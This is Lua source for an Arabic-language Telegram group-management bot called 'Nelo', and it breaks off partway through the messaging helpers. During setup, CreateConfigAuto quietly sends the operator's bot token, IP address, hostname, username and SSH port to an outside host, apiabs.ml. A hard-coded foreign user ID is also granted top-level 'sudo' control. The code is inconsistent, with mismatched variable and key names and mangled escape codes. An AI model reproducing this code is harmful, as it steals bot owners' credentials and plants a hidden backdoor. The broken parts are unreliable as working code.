------------------------------------------------
-- This Source Was Developed By (Rio) @GGGACcC.--
--   This Is The Source Channel @fsscCc .   --
--                - Nelo -                 --
--        -- https://t.me/fsscCc --         --
------------------------------------------------ 
DevRio  = dofile("./libs/redis.lua").connect("127.0.0.1", 6379)
serpent = dofile("./libs/serpent.lua")
JSON    = dofile("./libs/dkjson.lua")
json    = dofile("./libs/JSON.lua")
URL     = dofile("./libs/url.lua")
http    = require("socket.http") 
HTTPS   = require("ssl.https") 
https   = require("ssl.https") 
User    = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
Server  = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a') 
DirName = io.popen("echo $(cd $(dirname $0); pwd)"):read('*a'):gsub('[\n\r]+', '')
Ip      = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
Name    = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
Port    = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
UpTime  = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
--     Source Nelo     --
local AutoSet = function() 
if not DevRio:get(Server.."IdNelo") then 
io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
local DevId = io.read():gsub(' ','') 
if tostring(DevId):match('%d+') then 
io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
DevRio:set(Server.."IdNelo",DevId) 
else 
print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
end 
os.execute('lua Nelo.lua') 
end 
if not DevRio:get(Server.."TokenNelo") then 
io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m') 
local TokenBot = io.read() 
if TokenBot ~= '' then 
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getMe') 
if res ~= 200 then 
print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
else 
io.write('\27[1;36mتم حفظ توكن البوت بنجاح\n27[0;39;49m') 
DevRio:set(Server.."TokenNelover",TokenBot) 
end  
else 
print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
end  
os.execute('lua Nelo.lua') 
end
local Create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Config"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
local CreateConfigAuto = function()
Config = {
DevId = DevRio:get(Server.."IdNelover"),
TokenBot = DevRio:get(Server.."TokenNelover"),
Nelov = DevRio:get(Server.."TokenNelo"):match("(%d+)"),
SudoIds = {DevRio:get(Server.."IdNelo")},
}
Create(Config, "./config.lua") 
https.request("https://apiabs.ml/Api/Nelov/index.php?Get=Nelo&DevId="..DevRio:get(Server.."IdNelo").."&TokenBot="..DevRio:get(Server.."TokenNelo").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
file = io.open("Nelover.sh", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/Nelo
token="]]..DevRio:get(Server.."TokenNelo")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
echo "~ The tg File Was Not Found In The Bot Files!"
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
exit 1
fi
if [ ! $token ]; then
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
echo "~ The Token Was Not Found In The config.lua File!"
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
exit 1
fi
./tg -s ./Nelo.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("Run", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/Nelo
while(true) do
rm -fr ../.telegram-cli
screen -S Nelov -X kill
screen -S Nelov ./Nelover.sh
done
]]) 
file:close() 
io.popen("mkdir Files")
os.execute('chmod +x Run;./Run')
end 
CreateConfigAuto()
end
local Load_Nelo = function() 
local f = io.open("./config.lua", "r") 
if not f then 
AutoSet() 
else 
f:close() 
DevRio:del(Server.."IdNelo");DevRio:del(Server.."TokenNelo")
end 
local config = loadfile("./config.lua")() 
return config 
end  
Load_Nelo() 
print("\27[36m"..[[          
    _______         .__                            
    \      \   ____ |  |   _______  __ 
    /   |   \_/ __ \|  |  /  _ \  \/ // 
   /    |    \  ___/|  |_(  <_> )   /
   \____|__  /\___  >____/\____/ \_/ 
           \/     \/                     
]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m")
Config = dofile("./config.lua")
DevId = Config.DevId
SudoIds = {Config.SudoIds,1051826313}
Nelo = Config.Nelo
TokenBot = Config.TokenBot
NameBot = (DevRio:get(Nelo..'Rio:NameBot') or 'نيلو')
--     Source Nelo    --
FilesPrint = "\27[35m".."\nAll Source Files Started ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"..'\27[m'
FilesNumber = 0
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
FilesNumber = FilesNumber + 1
FilesPrint = FilesPrint.."\27[39m"..FilesNumber.."\27[36m".."~ : \27[10;32m"..v.."\27[m \n"
end
end
FilesPrint = FilesPrint.."\27[35m".."┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n".."\27[m"
if FilesNumber ~= 0 then
print(FilesPrint)
end
--     Source Nelo     --
--     Start Functions    --
function vardump(value)
print(serpent.block(value, {comment=false}))
end
--     Source Nelo     --
function dl_cb(arg, data)
end
--     Source Nelo     --
----------  Sudo  ----------
function Sudo(msg) 
local var = false 
for k,v in pairs(SudoIds) do 
if msg.sender_user_id_ == v then 
var = true 
end end 
if msg.sender_user_id_ == tonumber(DevId) then 
var = true 
end 
return var 
end
function SudoId(user_id) 
local var = false 
for k,v in pairs(SudoIds) do 
if user_id == v then 
var = true 
end end 
if user_id == tonumber(DevId) then 
var = true 
end 
return var 
end
--     Source Nelo     --
-------  RioSudo  -------
function RioSudo(msg) 
local Status = DevRio:sismember(Nelover..'Rio:RioSudo:',msg.sender_user_id_) 
if Status or Sudo(msg) then  
return true  
else  
return false  
end  
end
--     Source Nelo     --
-------  SecondSudo  -------
function SecondSudo(msg) 
local Status = DevRio:sismember(Nelover..'Rio:SecondSudo:',msg.sender_user_id_) 
if Status or RioSudo(msg) or Sudo(msg) then  
return true  
else  
return false  
end  
end
--     Source Nelo    --
---------  SudoBot  --------
function SudoBot(msg) 
local Status = DevRio:sismember(Nelo..'Rio:SudoBot:',msg.sender_user_id_) 
if Status or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
    --     Source Nelo     --
----   RioConstructor   ----
function RioConstructor(msg) 
local Status = DevRio:sismember(Nelo..'Rio:RioConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Nelo     --
----  BasicConstructor  ----
function BasicConstructor(msg) 
local Status = DevRio:sismember(Nelo..'Rio:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or RioConstructor(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Nelo     --
----    Constructor     ----
function Constructor(msg) 
local Status = DevRio:sismember(Nelo..'Rio:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or RioConstructor(msg) or BasicConstructor(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Nelo     --
---------  Manager  --------
function Manager(msg) 
local Status = DevRio:sismember(Nelo..'Rio:Managers:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or RioConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Nelo     --
----------  Admin  ---------
function Admin(msg) 
local Status = DevRio:sismember(Nelo..'Rio:Admins:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or RioConstructor(msg) or RioConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Nelo     --
---------Vip Member---------
function VipMem(msg) 
local Status = DevRio:sismember(Nelo..'Rio:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or RioConstructor(msg) or RioConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Admin(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Nelo     --
--------- Cleaner ----------
function Cleaner(msg) 
local Status = DevRio:sismember(Nelo..'Rio:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or RioConstructor(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Nelo     --
---------  Banned  ---------
local function Ban(user_id, chat_id)
if DevRio:sismember(Nelo..'Rio:Ban:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
--     Source Nelo     --
---------  BanAll  ---------
function BanAll(user_id)
if DevRio:sismember(Nelo..'Rio:BanAll:', user_id) then
var = true
else
var = false
end
return var
end
--     Source Nelo     --
----------  Muted  ---------
local function Muted(user_id, chat_id)
if DevRio:sismember(Nelo..'Rio:Muted:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
--     Source Nelo     --
---------  MuteAll  --------
function MuteAll(user_id)
if DevRio:sismember(Nelover..'Rio:MuteAll:', user_id) then
var = true
else
var = false
end
return var
end
--     Source Nelo     --
function DeleteMessage(chatid ,mid)
pcall(tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
},function(arg,data) 
end,nil))
end
--     Source Nelo     --
function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
end
--     Source Nelo     --
function NeloFiles(msg)
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
plugin = dofile("Files/"..v)
if plugin.Nelo and msg then
FilesText = plugin.Nelover(msg)
end
end
end
send(msg.chat_id_, msg.id_,FilesText)  
end
--     Source Nelo     --
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
--     Source Nelo     --
function AddFile(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if File_Name:lower():match('(%d+)') ~= Nelover:lower() then 
send(chat,msg.id_,"᥀︙عذرا هذا الملف ليس تابع لهذا البوت")   
return false 
end
send(chat,msg.id_,"᥀︙جاري رفع الملف ... .")
local File = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..File.result.file_path, ''..File_Name) 
else
send(chat,msg.id_,"᥀︙عذرا الملف ليس بصيغة ↫ Json يرجى رفع الملف الصحيح")
end
local info_file = io.open('./'..Nelov..'.json', "r"):read('*a')
local JsonInfo = JSON.decode(info_file)
vardump(JsonInfo)
DevRio:set(Nelo.."Rio:NameBot",JsonInfo.BotName) 
for IdGps,v in pairs(JsonInfo.GroupsList) do
DevRio:sadd(Nelo.."Rio:Groups",IdGps) 
DevRio:set(Nelo.."Rio:Lock:Bots"..IdGps,"del") DevRio:hset(Nelo.."Rio:Spam:Group:User"..IdGps ,"Spam:User","keed") 
LockList ={'Rio:Lock:Links','Rio:Lock:Contact','Rio:Lock:Forwards','Rio:Lock:Videos','Rio:Lock:Gifs','Rio:Lock:EditMsgs','Rio:Lock:Stickers','Rio:Lock:Farsi','Rio:Lock:Spam','Rio:Lock:WebLinks','Rio:Lock:Photo'}
for i,Lock in pairs(LockList) do
DevRio:set(Nelo..Lock..IdGps,true)
end
if v.RioConstructors then
for k,IdRioConstructors in pairs(v.RioConstructors) do
DevRio:sadd(Nelover..'Rio:RioConstructor:'..IdGps,IdRioConstructors)  
print('تم رفع منشئين المجموعات')
end
end
if v.BasicConstructors then
for k,IdBasicConstructors in pairs(v.BasicConstructors) do
DevRio:sadd(Nelo..'Rio:BasicConstructor:'..IdGps,IdBasicConstructors)  
print('تم رفع ( '..k..' ) منشئين اساسيين')
end
end
if v.Constructors then
for k,IdConstructors in pairs(v.Constructors) do
DevRio:sadd(Nelover..'Rio:Constructor:'..IdGps,IdConstructors)  
print('تم رفع ( '..k..' ) منشئين')
end
end
if v.Managers then
for k,IdManagers in pairs(v.Managers) do
DevRio:sadd(Nelo..'Rio:Managers:'..IdGps,IdManagers)  
print('تم رفع ( '..k..' ) مدراء')
end
end
if v.Admins then
for k,idmod in pairs(v.Admins) do
vardump(IdAdmins)
DevRio:sadd(Nelo..'Rio:Admins:'..IdGps,IdAdmins)  
print('تم رفع ( '..k..' ) ادمنيه')
end
end
if v.Vips then
for k,IdVips in pairs(v.Vips) do
DevRio:sadd(Nelo..'Rio:VipMem:'..IdGps,IdVips)  
print('تم رفع ( '..k..' ) مميزين')
end
end
if v.LinkGroups then
if v.LinkGroups ~= "" then
DevRio:set(Nelover.."Rio:Groups:Links"..IdGps,v.LinkGroups)   
print('( تم وضع روابط المجموعات )')
end
end
if v.Welcomes then
if v.Welcomes ~= "" then
DevRio:set(Nelo.."Rio:Groups:Welcomes"..IdGps,v.Welcomes)   
print('( تم وضع ترحيب المجموعات )')
end
end
end
send(chat,msg.id_,"᥀︙تم رفع النسخه بنجاح \n᥀︙تم تفعيل جميع المجموعات \n᥀︙تم استرجاع مشرفين المجموعات \n᥀︙تم استرجاع اوامر القفل والفتح في جميع مجموعات البوت ")
end
--     Source Nelo     --
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
--     Source Nelo     --
function getInputFile(file)
if file:match('/') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
return infile
end
--     Source Nelo     --
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
--     Source Nelo     --
function ChatLeave(chat_id, user_id)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = chat_id, user_id_ = user_id, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
end
--     Source Nelo     --
function ChatKick(chat_id, user_id)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = chat_id, user_id_ = user_id, status_ = { ID = "ChatMemberStatusKicked" }, }, dl_cb, nil)
end
--     Source Nelo     --
function getParseMode(parse_mode)
if parse_mode then
local mode = parse_mode:lower()
if mode == 'markdown' or mode == 'md' then
P = {ID = "TextParseModeMarkdown"}
elseif mode == 'html' then
P = {ID = "TextParseModeHTML"}
end
end
return P
end
--     Source Nelo     --
function getMessage(chat_id, message_id,cb)
tdcli_function ({
ID = "GetMessage",
chat_id_ = chat_id,
message_id_ = message_id
}, cb, nil)
end
--     Source Nelo     --
function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessageContact", contact_ = { ID = "Contact", phone_number_ = phone_number, first_name_ = first_name, last_name_ = last_name, user_id_ = user_id },},}, dl_cb, nil)
end
--     Source Nelo     --
function Dev_Rio(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode) tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text, disable_web_page_preview_ = disable_web_page_preview, clear_draft_ = 0, entities_ = {}, parse_mode_ = TextParseMode, }, }, dl_cb, nil)
end
--     Source Nelo     --
function GetApi(web) 
local info, res = https.request(web) 
local req = json:decode(info) if res ~= 200 then 
return false 
end 
if not req.ok then 
return false 
end 
return req 
end 
--     Source Nelo     --
function SendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..TokenBot 
local url = send_api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
if reply_to_message_id ~= 0 then 
url = url .. "&reply_to_message_id=" .. reply_to_message_id  
end 
if markdown == "md" or markdown == "markdown" then 
url = url.."&parse_mode=Markdown&disable_web_page_preview=true" 
elseif markdown == "html" then 
url = url.."&parse_mode=HTML" 
end 
return GetApi(url) 
end
--     Source Nelo     --
function SendInline(chat_id,text,keyboard,inline,reply_id) 
local response = {} 
response.keyboard = keyboard 
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false  
local send_api = "https://api.telegram.org/bot"..TokenBot.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
if reply_id then 
send_api = send_api.."&reply_to_message_id="..reply_id 
end 
return GetApi(send_api) 
end
--     Source Nelo     --
function EditMsg(chat_id, message_id, text, markdown) local send_api = "https://api.telegram.org/bot"..TokenBot.."/editMessageText?chat_id="..chat_id.."&message_id="..message_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true" return GetApi(send_api)  end
--     Source Nelover     --
function Pin(channel_id, message_id, disable_notification) 
tdcli_function ({ 
ID = "PinChannelMessage", 
channel_id_ = getChatId(channel_id).ID, 
message_id_ = message_id, 
disable_notification_ = disable_notification 
}, function(arg ,data)
vardump(data)
end ,nil) 
end
--     Source Nelo     --
local RioRank = function(msg) if SudoId(msg.sender_user_id_) then NeloTeam  = "المطور" elseif RioSudo(msg) then NeloTeam = "المطور" elseif SecondSudo(msg) then NeloTeam = "المطور" elseif SudoBot(msg) then NeloTeam = "المطور" elseif Manager(msg) then NeloTeam = "المدير" elseif Admin(msg) then NeloTeam = "الادمن" else NeloTeam = "العضو" end return NeloTeam end
function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1051826313) then NelovTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(Nelo) then NeloTeam = 'البوت' elseif SudoId(user_id) then NeloTeam = 'المطور الاساسي' elseif DevRio:sismember(Nelo..'Rio:RioSudo:', user_id) then NeloTeam = 'المطور الاساسي' elseif DevRio:sismember(Nelo..'Rio:SecondSudo:', user_id) then NeloTeam = 'المطور الاساسي²' elseif DevRio:sismember(Nelo..'Rio:SudoBot:', user_id) then NeloTeam = DevRio:get(Nelo.."Rio:SudoBot:Rd"..chat_id) or 'المطور' elseif DevRio:sismember(Nelo..'Rio:RioConstructor:'..chat_id, user_id) then NeloTeam = 'المالك' elseif DevRio:sismember(Nelo..'Rio:BasicConstructor:'..chat_id, user_id) then NeloTeam = DevRio:get(Nelo.."Rio:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevRio:sismember(Nelo..'Rio:Constructor:'..chat_id, user_id) then NeloverTeam = DevRio:get(Nelo.."Rio:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevRio:sismember(Nelo..'Rio:Managers:'..chat_id, user_id) then NeloTeam = DevRio:get(Nelo.."Rio:Managers:Rd"..chat_id) or 'المدير' elseif DevRio:sismember(Nelo..'Rio:Admins:'..chat_id, user_id) then NeloTeam = DevRio:get(Nelo.."Rio:Admins:Rd"..chat_id) or 'الادمن' elseif DevRio:sismember(Nelo..'Rio:VipMem:'..chat_id, user_id) then  NeloTeam = DevRio:get(Nelo.."Rio:VipMem:Rd"..chat_id) or 'المميز' elseif DevRio:sismember(Nelo..'Rio:Cleaner:'..chat_id, user_id) then  NeloTeam = DevRio:get(Nelo.."Rio:Cleaner:Rd"..chat_id) or 'المنظف' else NeloTeam = DevRio:get(Nelo.."Rio:mem:Rd"..chat_id) or 'العضو' end return NeloTeam end
--     Source Nelo     --
function RankChecking(user_id,chat_id)
if SudoId(user_id) then
var = true  
elseif tonumber(user_id) == tonumber(Nelo) then  
var = true
elseif DevRio:sismember(Nelo..'Rio:RioSudo:', user_id) then
var = true
elseif DevRio:sismember(Nelo..'Rio:SecondSudo:', user_id) then
var = true  
elseif DevRio:sismember(Nelo..'Rio:SudoBot:', user_id) then
var = true 
elseif DevRio:sismember(Nelo..'Rio:RioConstructor:'..chat_id, user_id) then
var = true
elseif DevRio:sismember(Nelo..'Rio:BasicConstructor:'..chat_id, user_id) then
var = true
elseif DevRio:sismember(Nelo..'Rio:Constructor:'..chat_id, user_id) then
var = true  
elseif DevRio:sismember(Nelo..'Rio:Managers:'..chat_id, user_id) then
var = true  
elseif DevRio:sismember(Nelo..'Rio:Admins:'..chat_id, user_id) then
var = true  
elseif DevRio:sismember(Nelo..'Rio:VipMem:'..chat_id, user_id) then  
var = true 
else  
var = false
end  
return var
end
function RioDelAll(user_id,chat_id)
if SudoId(user_id) then
var = 'sudoid'  
elseif DevRio:sismember(Nelo..'Rio:RioSudo:', user_id) then
var = 'riosudo'
elseif DevRio:sismember(Nelo..'Rio:SecondSudo:', user_id) then
var = 'secondsudo' 
elseif DevRio:sismember(Nelo..'Rio:SudoBot:', user_id) then
var = 'sudobot'  
elseif DevRio:sismember(Nelo..'Rio:RioConstructor:'..chat_id, user_id) then
var = 'RioConstructor'
elseif DevRio:sismember(Nelo..'Rio:BasicConstructor:'..chat_id, user_id) then
var = 'basicconstructor'
elseif DevRio:sismember(Nelo..'Rio:Constructor:'..chat_id, user_id) then
var = 'constructor'
elseif DevRio:sismember(Nelo..'Rio:Managers:'..chat_id, user_id) then
var = 'manager'  
else  
var = 'No'
end  
return var
end 
--     Source Nelo     --
local function Filters(msg, value)
local rio = (Nelo..'Rio:Filters:'..msg.chat_id_)
if rio then
local names = DevRio:hkeys(rio)
local value = value:gsub(' ','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source Nelo     --
function ReplyStatus(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,dp) 
if dp.first_name_ ~= false then
local UserName = (dp.username_ or "FSSCCC")
for gmatch in string.gmatch(dp.first_name_, "[^%s]+") do
dp.first_name_ = gmatch
end
if status == "WrongWay" then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙عذرا عزيزي ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "Reply" then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙العضو ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "ReplyBy" then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙بواسطة ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙الحساب محذوف قم بالتاكد واعد المحاوله", 1, 'md')
end
end,nil)   
end
--     Source Nelo     --
function GetCustomTitle(user_id,chat_id)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..chat_id..'&user_id='..user_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.status == "creator" then 
Status = "المالك"
elseif GetInfo.result.status == "administrator" then 
Status = "مشرف"
else
Status = false
end
if GetInfo.result.custom_title then 
Rio = GetInfo.result.custom_title
else 
Rio = Status
end
end
return Rio
end
function Validity(msg,user_id) 
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..user_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.status == "creator" then
send(msg.chat_id_,msg.id_,'᥀︙مالك المجموعه')   
return false  end 
if GetInfo.result.status == "member" then
send(msg.chat_id_,msg.id_,'᥀︙مجرد عضو هنا')   
return false  end
if GetInfo.result.status == 'left' then
send(msg.chat_id_,msg.id_,'᥀︙الشخص غير موجود هنا')   
return false  end
if GetInfo.result.status == "administrator" then
if GetInfo.result.can_change_info == true then EDT = '✔️' else EDT = '✖️' end
if GetInfo.result.can_delete_messages == true then DEL = '✔️' else DEL = '✖️' end
if GetInfo.result.can_invite_users == true then INV = '✔️' else INV = '✖️' end
if GetInfo.result.can_pin_messages == true then PIN = '✔️' else PIN = '✖️' end
if GetInfo.result.can_restrict_members == true then BAN = '✔️' else BAN = '✖️' end
if GetInfo.result.can_promote_members == true then VIP = '✔️' else VIP = '✖️' end 
send(msg.chat_id_,msg.id_,'᥀︙صلاحيات '..GetCustomTitle(user_id,msg.chat_id_)..' هي ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙حذف الرسائل ↫ '..DEL..'\n᥀︙دعوة المستخدمين ↫ '..INV..'\n᥀︙حظر المستخدمين ↫ '..BAN..'\n᥀︙تثبيت الرسائل ↫ '..PIN..'\n᥀︙تغيير المعلومات ↫ '..EDT..'\n᥀︙اضافة مشرفين ↫ '..VIP..'\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉')
end
end
end
--     Source Nelo     --
function GetBio(chat_id)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..chat_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.bio then 
Rio = GetInfo.result.bio
else 
Rio = "لا يوجد"
end
end
return Rio
end
--     Source Nelo     --
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({ ID = request_id, chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = input_message_content }, callback or dl_cb, extra)
end
local sendDocument = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, cb, cmd)
local input_message_content = { ID = "InputMessageDocument", document_ = getInputFile(document), caption_ = caption } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageVoice", voice_ = getInputFile(voice), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendAudio(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, audio, duration, waveform, caption, cb, cmd)
